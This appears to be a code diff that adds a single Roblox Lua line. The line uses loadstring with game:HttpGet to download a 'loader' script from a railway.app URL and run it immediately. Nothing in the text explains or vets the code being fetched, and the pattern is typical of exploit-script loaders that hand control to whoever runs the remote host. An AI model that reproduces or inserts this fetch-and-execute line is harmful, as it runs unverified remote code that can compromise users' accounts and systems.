@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://vantarmorweb-production.up.railway.app/files/v1/loaders/9ca09d1645a6b9088dbeebb05ac959cb1a95aab4.lua"))()
